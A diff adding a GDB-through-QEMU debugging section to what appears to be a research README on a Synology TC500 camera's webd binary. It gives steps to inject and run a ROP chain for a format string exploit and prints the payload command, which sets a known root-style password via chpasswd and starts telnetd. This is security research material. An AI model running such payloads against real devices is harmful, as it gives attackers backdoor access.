@@ -18,6 +18,43 @@ Then, inside the container run -
 sh /host/webd.sh
 ```
 
+## GDB Debugging
+
+For debugging the webd binary with GDB through QEMU:
+
+1. Start the container with GDB server:
+```sh
+# In container
+sh /host/webd.sh gdb
+```
+
+2. Connect with GDB and inject ROP chain:
+```sh
+# In host terminal
+gdb-multiarch -x rop_simple.gdb
+(gdb) target remote localhost:1234
+(gdb) break *0x28a5c    # Replace with your target function/address
+(gdb) continue
+# When breakpoint hits:
+(gdb) inject_rop        # Inject ROP chain to stack
+(gdb) execute_rop       # Redirect execution to ROP chain
+(gdb) continue          # Execute the ROP chain
+```
+
+### ROP Chain Injection Scripts
+
+- **`rop_simple.gdb`** - Simple manual injection script with commands:
+  - `inject_rop [offset]` - Write ROP chain to stack at SP + offset
+  - `execute_rop [offset]` - Redirect execution to ROP chain  
+  - `show_rop [offset]` - Display ROP chain contents
+
+- **`rop_inject.gdb`** - Automated injection script that triggers on breakpoint
+
+The ROP chain implements the Synology TC500 format string exploit and executes:
+```bash
+sh -c 'echo synodebug:synodebug|chpasswd;telnetd'
+```
+
 ## References
 
 * https://www.synacktiv.com/en/publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from
